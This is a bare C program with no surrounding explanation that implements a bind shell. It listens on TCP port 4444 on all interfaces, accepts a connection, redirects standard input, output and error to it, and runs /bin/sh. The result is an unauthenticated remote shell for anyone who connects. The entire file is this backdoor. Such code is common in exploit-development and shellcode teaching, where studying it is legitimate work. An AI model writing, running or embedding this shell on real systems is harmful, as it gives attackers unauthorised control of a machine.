#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>

int main(void) {
        int sockfd, newsockfd;
        struct sockaddr_in serverSA, clientSA;
        int clientSaSize;
        char *arg_list[] = { { "/bin/sh" }, NULL };
        sockfd = socket(PF_INET, SOCK_STREAM, 0);
        memset(serverSA.sin_zero, '\0', sizeof(serverSA.sin_zero));
        serverSA.sin_family = AF_INET;
        serverSA.sin_addr.s_addr = htonl(INADDR_ANY);
        serverSA.sin_port = htons(4444);
        bind(sockfd, (struct sockaddr *)&serverSA, sizeof(serverSA));
        listen(sockfd, 2);
        newsockfd = accept(sockfd, (struct sockaddr *)&clientSA, &clientSaSize);
        dup2(newsockfd, 0);
        dup2(newsockfd, 1);
        dup2(newsockfd, 2);
        execve(arg_list[0], arg_list, arg_list[1]);
        close(sockfd);
        return 0;
}
